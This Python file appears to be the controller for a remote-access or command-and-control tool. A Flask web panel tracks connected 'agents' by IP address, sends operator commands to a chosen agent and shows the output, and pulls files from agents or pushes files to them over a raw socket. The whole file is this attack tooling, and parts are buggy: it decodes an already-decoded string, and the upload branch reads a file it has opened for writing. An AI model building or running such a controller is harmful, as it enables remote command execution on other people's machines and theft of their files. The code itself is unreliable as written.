import socket
import threading,time
from flask import *
from flask import Flask
import re
from pathlib import Path
ip='127.0.0.1'
port=1234
thread_index=0
THREADS=[]
CMD_INPUT=[]
CMD_OUTPUT=[]
IPS=[]
for  i in range(20):
    CMD_OUTPUT.append('')
    CMD_INPUT.append('')
app=Flask(__name__,template_folder='templates')

def handle_connections(connection,address,thread_index):
    global CMD_INPUT
    global CMD_OUTPUT
    while CMD_INPUT[thread_index]!='quit' :
        msg=connection.recv(1024*10000).decode()
        CMD_OUTPUT[thread_index]=msg
        while True:
            if CMD_INPUT[thread_index]!='':
                if CMD_INPUT[thread_index].split(" ")[0]=='download':
                    filename=CMD_INPUT[thread_index].split(" ")[1]
                    cmd=CMD_INPUT[thread_index]
                    connection.send(cmd.encode())
                    content=connection.recv(1024*10000).decode()
                    f=open('.\\output\\'+filename,'wb')
                    f.write(content.decode())
                    f.close()
                    CMD_OUTPUT[thread_index]="File Transferred successfully"
                    CMD_INPUT[thread_index]=''
                elif CMD_INPUT[thread_index].split(" ")[0]=='upload':
                    cmd=CMD_INPUT[thread_index]
                    connection.send(cmd.encode())
                    filename=CMD_INPUT[thread_index].split(" ")[1]
                    f=open('.\\output\\'+filename,'wb')
                    content=f.read()
                    f.close()
                    connection.send(content.encode())
                    msg=connection.recv(1024*10000).decode()
                    if msg=='got file' :
                        CMD_OUTPUT[thread_index]='file sent successfully'
                        CMD_INPUT[thread_index]=''
                    else:
                        CMD_OUTPUT[thread_index]='an Error occured'
                        CMD_INPUT[thread_index]=''
                else:
                    msg=CMD_INPUT[thread_index]
                    connection.send(msg.encode())
                    CMD_INPUT[thread_index]=''
                    break
    connection.close()

def close_connection(connection,thread_index):
    THREADS[thread_index]=''
    CMD_INPUT[thread_index]=''
    CMD_OUTPUT[thread_index]=''
    IPS[thread_index]=''
    connection.close()
def server_socket():
    global THREADS
    global IPS
    ss=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    ss.bind((ip,port))
    ss.listen(5)
    while True:
        connection,address=ss.accept()
        t=threading.Thread(target=handle_connections,args=(connection,address,len(THREADS)))
        THREADS.append(t)
        IPS.append(address)
        t.start()
def get_agent_number(thread):
    thread_name = thread.name
    return re.search(r'\d+', thread_name).group() 
@app.before_request
def init_server():
    s=threading.Thread(target=server_socket)
    s.start()
@app.route("/")
def home():
    return render_template("home.html")
@app.route("/agents")
def agents():
    return render_template('agents.html',agents=THREADS,ips=IPS,get_agent_number=get_agent_number)
@app.route("/<agentname>/control")
def executecmd(agentname,methods=['GET','POST']):
    return render_template("control.html",name=agentname,get_agent_number=get_agent_number)

@app.route("/<agentname>/execute",methods=['GET','POST'])
def execute(agentname):
    req_index=0
    if request.method=='POST':
        cmd=request.form['command']
        for i in THREADS:
            if agentname in i.name:
                req_index=THREADS.index(i)
        CMD_INPUT[req_index]=cmd
        time.sleep(1)
        cmdoutput=CMD_OUTPUT[req_index]
        return render_template('control.html',cmdoutput=cmdoutput,name=agentname)



if __name__=='__main__':
    app.run(debug=True)




